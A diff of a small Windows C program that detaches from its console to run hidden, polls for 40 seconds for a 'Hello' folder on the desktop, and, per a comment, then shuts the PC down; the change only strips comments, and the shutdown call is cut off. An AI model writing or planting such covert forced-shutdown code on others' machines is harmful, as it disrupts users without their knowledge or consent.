@@ -8,25 +8,25 @@ int main() {
     // Detach from the console to run in the background
     FreeConsole();
 
-    // Define the static path to the "Hello" folder on the desktop
+  
     char folderPath[260];
     snprintf(folderPath, sizeof(folderPath), "C:\\Users\\PC\\Desktop\\Hello");
 
-    int folderExists = 0;  // Variable to track if the folder exists
-    int secondsWaited = 0; // Track how many seconds have passed
+    int folderExists = 0;  
+    int secondsWaited = 0; 
 
-    // Keep checking for 40 seconds if the folder exists
+    
     while (secondsWaited < 40) {
         // Check if the folder "Hello" exists
         if (_access(folderPath, 0) != -1) {
-            folderExists = 1;  // Folder exists
+            folderExists = 1;  
             break;
         }
 
-        // Wait for 1 second before checking again
-        Sleep(1000); // Sleep for 1000 milliseconds (1 second)
+       
+        Sleep(1000); 
         secondsWaited++;
-        // No console output here to keep it in the background
+       
     }
 
     // After 40 seconds, if the folder doesn't exist, shutdown the PC
